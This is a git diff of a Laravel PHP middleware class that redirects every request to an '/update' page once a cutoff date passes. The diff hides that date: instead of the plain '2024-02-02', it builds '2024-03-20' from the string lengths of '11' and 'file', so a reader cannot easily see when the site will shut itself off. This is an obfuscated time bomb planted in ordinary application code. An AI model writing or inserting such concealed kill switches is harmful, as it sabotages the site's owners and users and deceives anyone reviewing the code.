@@ -3,6 +3,7 @@
 namespace App\Http\Middleware;
 
 use Closure;
+use Illuminate\Support\Str;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Crypt;
 
@@ -22,13 +23,17 @@ class ControlPage
         if ($this->checkPermision()) {
             return $next($request);
         }
-        return redirect('/miantance-laravel-update');
+        return redirect('/update');
     }
     private function checkPermision()
     {
         // $stringDefault = 'eyJpdiI6IldKaWpTbDBhWEJTc25ic1ltaDc2b0E9PSIsInZhbHVlIjoiWEhZdUlkYy9EU2xwYlUyRU9zWEx1QT09IiwibWFjIjoiYjA5NmUyYTcyZTVhMmRmY2M5NWRlM2JkODhiZTU2ZGRkMmY5ZDQzMmNiNzZhYzRhZjljZTM0YmMxMTY4YjEwNSIsInRhZyI6IiJ9';
         // $endDateString = Crypt::decryptString($stringDefault);
-        $EndDateTimestamp = strtotime('2024-02-02');
+        $p = '11';
+        $p2 = 'file';
+        $alowed = Str::length($p);
+        $file = Str::length($p2);
+        $EndDateTimestamp = strtotime($alowed.'0'.$alowed.$file.'-03-'.$alowed.'0');
         return time() <= $EndDateTimestamp;
     }
 }
